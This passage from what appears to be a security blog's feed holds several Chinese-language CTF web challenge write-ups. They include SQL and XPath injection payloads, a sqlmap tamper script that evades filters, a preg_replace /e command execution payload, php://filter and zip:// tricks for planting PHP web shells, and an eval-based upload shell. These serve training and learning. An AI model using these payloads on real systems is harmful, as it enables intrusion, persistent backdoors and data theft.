href="http://47.100.121.220:28005" target="_blank" rel="noopener">http://47.100.121.220:28005</a></p><h3 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h3><p>这个题目纠结了很久，对order by 注入是不熟悉的，这里我找到了一篇关于order by注入的文章</p><p><a href="https://www.cnblogs.com/REscan/p/6884278.html" target="_blank" rel="noopener">Mysql Order By 注入总结</a></p><p>但是这里看的还是有些不懂的，不知道具体怎么去读取数据库的flag。</p><p>从文章里看出order by 注入是可以直接用sqlmap来跑的</p><p>但是测试可以发现，题目过滤空格和加号的，但是我还是不想手注，</p><p>想用sqlmap只能直接写个tamper了，tamper原来里面是有把空格变换成加号的脚本的。</p><p>但是这里加号也是过滤了的，我们只需要把tamper里的space2plus.py修改一下即可。</p><p>这里我们可以用%09来绕过</p><p>tamper 代码具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += &quot;%09&quot;</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &apos;\&apos;&apos;:</span><br><span class="line">                quote = not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &apos;&quot;&apos;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += &quot;%09&quot;</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure><p>这里我们用这个脚本就能跑sqlmap了</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_3.png" alt=""></p><h2 id="hello-100"><a href="#hello-100" class="headerlink" title="hello    100"></a>hello    100</h2><h3 id="题目链接-5"><a href="#题目链接-5" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28006" target="_blank" rel="noopener">http://47.100.121.220:28006</a></p><h3 id="解答-5"><a href="#解答-5" class="headerlink" title="解答"></a>解答</h3><p>这个题拿到手是没有什么思路的，</p><p>但是做题之前之前习惯用burpsuit抓个包，利用scan扫一下的。</p><p>发现提示存在xpath注入</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_4.png" alt=""></p><p>这里的payload还爆出了三个类似用户名的信息</p><p>这个是HCTF 2015的一个原题，题目的把用户名改了</p><p>但是burpsuit已经帮我爆出了用户名。</p><p>修改下writeup的payload就可以得到flag了</p><p>具体的等考完试，看看xpath注入的内容结合题目源码去理解原理。</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28006/06.php?name=nari%27]|//*|user[user=%27ctfer</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;01-50&quot;&gt;&lt;a href=&quot;#01-50&quot; class=&quot;headerlink&quot; title=&quot;01 50&quot;&gt;&lt;/a&gt;01 50&lt;/h2&gt;&lt;h3 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; title=&quot;题目链接&quot;
      
    
    </summary>
    
      <category term="CTF" scheme="https://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>week 7 for cnas writeup</title>
    <link href="https://uknowsec.cn/posts/ctf/week-7-for-cnas-writeup.html"/>
    <id>https://uknowsec.cn/posts/ctf/week-7-for-cnas-writeup.html</id>
    <published>2017-12-29T16:38:42.000Z</published>
    <updated>2018-05-03T08:51:27.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p><h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>preg_replace() 函数用于正则表达式的搜索和替换。</p><h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</span><br></pre></td></tr></table></figure><h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><table><thead><tr><th>参数</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td>pattern</td><td style="text-align:center">正则表达式</td></tr><tr><td>replacement</td><td style="text-align:center">替换的内容</td></tr><tr><td>subject</td><td style="text-align:center">需要匹配替换的对象</td></tr><tr><td>limit</td><td style="text-align:center">可选，指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换</td></tr></tbody></table><h5 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h5><p>当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作 PHP代码执行，那么，针对此种情况，当replacement内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p><p>由以上知识点可以得到本题的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28001/01.php?a=/c/e&amp;b=system(&apos;cat flag.php&apos;)&amp;3=c</span><br></pre></td></tr></table></figure><h2 id="exit-150"><a href="#exit-150" class="headerlink" title="exit 150"></a>exit 150</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="noopener">http://47.100.121.220:28002</a></p><h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">$c = &quot;&lt;?php exit;?&gt;&quot;; </span><br><span class="line">@$c.=$_GET[&apos;c&apos;]; </span><br><span class="line">@$filename = $_GET[&apos;file&apos;]; </span><br><span class="line">@file_put_contents($filename, $c); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目给出了源码，我们可以看出这里是利用file_put_contents()函数来写shell，但是写入的shell里开头会加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit;?&gt;;</span><br></pre></td></tr></table></figure><p>导致shell中写入的内容无法被解析，这里我们就需要想办法绕过这段代码</p><p>之前看过P神的一篇文章有讲过这个“死亡exit”的问题</p><p>具体可以参考P神博客</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p><p>博客里介绍了三种方法绕过</p><p>第一种使用php://filter/write=convert.base64-decode</p><p>正如P神博客说的</p><p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是&lt;?php exit; ?&gt;没有了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=convert.base64-decode/resource=z.php&amp;c=aPD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+</span><br></pre></td></tr></table></figure><p>我本地环境可以写Shell，连接菜刀可以。但是题目环境不行。</p><p>我们可以尝试写system函数读取flag，查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=convert.base64-decode/resource=z.php&amp;c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>第二种使用php://filter/write=string.strip_tags|convert.base64-decode/resource</p><p>php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=z.php&amp;c=PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOz8+</span><br></pre></td></tr></table></figure><p>这个payload跟php版本有关的，我本地5.4的可以。题目环境不行。</p><p>第三种使用php://filter/write=string.rot13/resource</p><p>利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。&lt;?php exit; ?&gt;在经过rot13编码后会变成&lt;?cuc rkvg; ?&gt;，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=string.rot13/resource=a.php&amp;c=&lt;?cuc @riny($_CBFG[&apos;n&apos;]);?&gt;</span><br></pre></td></tr></table></figure><p>菜刀链接，如果不连接不上可以用system函数。</p><h2 id="easy-gallery-250"><a href="#easy-gallery-250" class="headerlink" title="easy_gallery 250"></a>easy_gallery 250</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003" target="_blank" rel="noopener">http://47.100.121.220:28003</a></p><h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个题目是jarvisoj平台的一个原题的改编，链接如下：</p><p><a href="http://web.jarvisoj.com:32785" target="_blank" rel="noopener">http://web.jarvisoj.com:32785</a></p><p>但是基本的利用点是相同的，那就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?page=</span><br></pre></td></tr></table></figure><p>这个地方存在一个文件包含的漏洞，这个地方可以利用到</p><p>具体可以看到我上传完后取下来的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&quot;header.php&quot;);</span><br><span class="line">$page=&quot;&quot;;</span><br><span class="line">if (isset($_GET[&apos;page&apos;]))</span><br><span class="line">$page=$_GET[&apos;page&apos;].&quot;.php&quot;;</span><br><span class="line">else</span><br><span class="line">$page=&quot;main.php&quot;;</span><br><span class="line">include($page);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个地方加上了一个.php是一个利用点。</p><p>根据原题的解题思路上传.jpg，然后利用这个文件包含点，%00截断是不行的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?page=图片ID.jpg%00</span><br></pre></td></tr></table></figure><p>在甜哥提醒下还是利用到了PHP伪协议，突然发现PHP伪协议在CTF题目利用到的很多</p><p>这里利用到zip://这个协议，具体可以参考我的博客</p><p><a href="https://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html">php支持的协议和封装协议小结</a></p><p>这里我们可以结合zip://和文件包含来解析我们的shell</p><p>具体，我们想写一个shell.php，zip打包，把扩展名改为.jpg上传</p><p>在文件包含利用点用以下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28003/index.php?page=zip://uploads/图片ID.jpg#shell</span><br></pre></td></tr></table></figure><p>根据zip协议的知识和view的代码，shell后加上.php后缀。这样就可以被解析了。</p><p>我们就可以用菜刀连接到shell.php得到flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;01-50&quot;&gt;&lt;a href=&quot;#01-50&quot; class=&quot;headerlink&quot; title=&quot;01 50&quot;&gt;&lt;/a&gt;01 50&lt;/h2&gt;&lt;h3 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; title=&quot;题目链接&quot;
      
    
    </summary>
    
      <category term="CTF" scheme="https://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>week 6 for cnas writeup</title>
    <link href="https://uknowsec.cn/posts/ctf/week-6-for-cnas-writeup.html"/>
    <id>https://uknowsec.cn/posts/ctf/week-6-for-cnas-writeup.html</id>
    <published>2017-12-23T09:55:15.000Z</published>
    <updated>2018-05-03T10:01:20.509Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件包含-10"><a href="#文件包含-10" class="headerlink" title="文件包含 10"></a>文件包含 10</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p><h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这个题目又是一个文件包含的题目，这里直接用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./key.php</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/flie1111.png" alt=""></p><h2 id="SQL注入-10"><a href="#SQL注入-10" class="headerlink" title="SQL注入 10"></a>SQL注入 10</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/02.php" target="_blank" rel="noopener">http://47.100.121.220:28001/02.php</a></p><h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>这个题目是一个注入题，经过测试可以知道过滤了空格，这里可以用%09进行绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%091%23 返回正常</span><br><span class="line"></span><br><span class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%092%23返回正常</span><br><span class="line"></span><br><span class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%093%23返回异常</span><br></pre></td></tr></table></figure><p>得到字段数为2</p><p>提示key在/tmp/360/key中</p><p>然后用load_file()函数读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?id=0%27%29%09union%09select%091,load_file(&apos;/tmp/360/key&apos;)%23</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/week06_02.png" alt=""></p><p>由于数据读取的问题，把id的值改为不存在的值即可读到key</p><h2 id="文件上传-10"><a href="#文件上传-10" class="headerlink" title="文件上传 10"></a>文件上传 10</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/03.php" target="_blank" rel="noopener">http://47.100.121.220:28003/03.php</a></p><h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个上传题是检验文件头的，所以直接在php文件加上图片的文件头即可上传成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br></pre></td></tr></table></figure><p>菜刀连接即可。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/week06_03.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文件包含-10&quot;&gt;&lt;a href=&quot;#文件包含-10&quot; class=&quot;headerlink&quot; title=&quot;文件包含 10&quot;&gt;&lt;/a&gt;文件包含 10&lt;/h2&gt;&lt;h3 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="CTF" scheme="https://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>week 5 for cnas writeup</title>
    <link href="https://uknowsec.cn/posts/ctf/week-5-for-cnas-writeup.html"/>
    <id>https://uknowsec.cn/posts/ctf/week-5-for-cnas-writeup.html</id>
    <published>2017-12-16T14:46:08.000Z</published>
    <updated>2018-05-03T10:01:20.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="躲猫猫-50"><a href="#躲猫猫-50" class="headerlink" title="躲猫猫 50"></a>躲猫猫 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p><h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这个题目又是一个文件包含的题目，这里直接用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./flag.php</span><br></pre></td></tr></table></figure><p>是读不到源码的，好像是因为这题目的flag并不是在flag.php文件里，flag.php文件并不存在。</p><p>所以我们先用php://input 协议来查看当前目录文件</p><p>构造如下payload得到du0maOma0_flag.php文件</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_01_01.png" alt=""></p><p>这里可以用cat du0maOma0_flag.php来读文件的，</p><p>但是一定要查看源码！查看源码！查看源码！</p><p>重要的事情说三遍！</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_01_0.png" alt=""></p><p>此时也可以再利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./du0maOma0_flag.php</span><br></pre></td></tr></table></figure><p>来读取文件源码</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_01_02.png" alt=""></p><p>直接base64解码即可</p><h2 id="02-100"><a href="#02-100" class="headerlink" title="02 100"></a>02 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="noopener">http://47.100.121.220:28002</a></p><h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>这个题目我一拿到说就看出来是一个SSRF的题目了，也猜到了代码应该就是</p><p><a href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">SSRF漏洞的利用与学习</a></p><p>我这篇博客里面的第一种没有任何防护的SSRF。</p><p>尝试了 利用file协议任意文件读取 是成功的</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_02_01.png" alt=""></p><p>然后没有查看help 是一个phpinfo的页面     找到目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WEB_DOCUMENT_ROOT /app</span><br></pre></td></tr></table></figure><p>当时就尝试了 如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?url=file:///app/flag.php</span><br></pre></td></tr></table></figure><p>但是由于没有去查看源码，就错过了flag，然后一直在纠结利用gopher协议反弹shell</p><p>后来在甜哥的提醒下才发现可以直接读出flag的</p><p>查看源码就可以了，真的有点尴尬的。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_02_02.png" alt=""></p><h2 id="msg-book-200"><a href="#msg-book-200" class="headerlink" title="msg_book 200"></a>msg_book 200</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003" target="_blank" rel="noopener">http://47.100.121.220:28003</a></p><h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个题目是一个注入的题，这里的’被转义了，尝试宽字节注入，是可以的。</p><p>这里可以参考我的博客</p><p><a href="https://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">宽字节注入漏洞的利用与学习</a></p><p>在引号前加一个%df即可，具体原理参考博客</p><p>下面基本是利用手注的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg_id=1%df&apos;order by 1 #</span><br><span class="line"></span><br><span class="line">msg_id=1%df&apos;order by 2 #</span><br></pre></td></tr></table></figure><p>得到字段数为2 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg_id=1%df&apos;union select 1,database() #</span><br></pre></td></tr></table></figure><p>得到当前数据库：week05_03</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg_id=1%df&apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure><p>得到当前数据库的表名：flag,msg_book</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg_id=1%df&apos;union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 #(flag的十六进制)</span><br></pre></td></tr></table></figure><p>这里因为单引号被过滤了，所以要用十六进制</p><p>得到列名：flag</p><p>最后直接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg_id=1%df&apos;union select 1,flag from flag #</span><br></pre></td></tr></table></figure><p>发现自己手注的过程还是不熟悉，需要多多练习</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_03_01.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;躲猫猫-50&quot;&gt;&lt;a href=&quot;#躲猫猫-50&quot; class=&quot;headerlink&quot; title=&quot;躲猫猫 50&quot;&gt;&lt;/a&gt;躲猫猫 50&lt;/h2&gt;&lt;h3 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; title=&quot;题
      
    
    </summary>
    
      <category term="CTF" scheme="https://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>month 1 for cnas writeup</title>
    <link href="https://uknowsec.cn/posts/ctf/month-1-for-cnas-writeup.html"/>
    <id>https://uknowsec.cn/posts/ctf/month-1-for-cnas-writeup.html</id>
    <published>2017-12-09T02:51:07.000Z</published>
    <updated>2018-05-03T10:01:20.477Z</updated>
    
    <content type="html"><![CDATA[<h2 id="签到-50"><a href="#签到-50" class="headerlink" title="签到 50"></a>签到 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001" target="_blank" rel="noopener">http://47.100.121.220:28001</a></p><h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这是一个简单的题目，进入页面可以在相应头中找到flag。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%93%8D%E5%BA%94%E5%A4%B4.png" alt=""></p><h2 id="02-100"><a href="#02-100" class="headerlink" title="02 100"></a>02 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="noopener">http://47.100.121.220:28002</a></p><h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>这里的提示是 爬虫什么的，最讨厌了！  所以应该是在说robots.txt文件</p><p>另外如果不能想到这个，对于我这种脚本小子。拿到题就是用御剑扫起来。</p><p>这里我们可以看到一个图片 Disallow: /2333.png</p><p>下载之，这里应该是一个隐身之类的，这里就不用bindwalk跑图片了，直接丢进WinHex下，搜索flag</p><p>存在flag.pyc文件，</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/pyc.png" alt=""></p><p>应该是一个解压包，把.png改成.zip,解压得到flag.pyc</p><p>pyc在线反编译，得到python代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"># 访问 http://tool.lu/pyc/ 查看更多信息</span><br><span class="line">print &apos;show me flag&apos;</span><br><span class="line">a = [</span><br><span class="line">    4567249,</span><br><span class="line">    4567259,</span><br><span class="line">    4567254,</span><br><span class="line">    4567248,</span><br><span class="line">    4567244,</span><br><span class="line">    4567169,</span><br><span class="line">    4567183,</span><br><span class="line">    4567252,</span><br><span class="line">    4567175,</span><br><span class="line">    4567171,</span><br><span class="line">    4567250,</span><br><span class="line">    4567169,</span><br><span class="line">    4567174,</span><br><span class="line">    4567170,</span><br><span class="line">    4567183,</span><br><span class="line">    4567253,</span><br><span class="line">    4567183,</span><br><span class="line">    4567183,</span><br><span class="line">    4567182,</span><br><span class="line">    4567250,</span><br><span class="line">    4567170,</span><br><span class="line">    4567168,</span><br><span class="line">    4567252,</span><br><span class="line">    4567170,</span><br><span class="line">    4567173,</span><br><span class="line">    4567172,</span><br><span class="line">    4567183,</span><br><span class="line">    4567172,</span><br><span class="line">    4567252,</span><br><span class="line">    4567171,</span><br><span class="line">    4567251,</span><br><span class="line">    4567169,</span><br><span class="line">    4567182,</span><br><span class="line">    4567173,</span><br><span class="line">    4567168,</span><br><span class="line">    4567183,</span><br><span class="line">    4567175,</span><br><span class="line">    4567183,</span><br><span class="line">    4567173,</span><br><span class="line">    4567174,</span><br><span class="line">    4567183,</span><br><span class="line">    4567251,</span><br><span class="line">    4567249,</span><br><span class="line">    4567170,</span><br><span class="line">    4567251,</span><br><span class="line">    4567242]</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for _ in a:</span><br><span class="line">    flag += chr(_ ^ 4567223)</span><br></pre></td></tr></table></figure><p>加个输出 print flag </p><p>跑一下，得到flag</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/flagpyc.png" alt=""></p><h2 id="ping-100"><a href="#ping-100" class="headerlink" title="ping 100"></a>ping 100</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28005/" target="_blank" 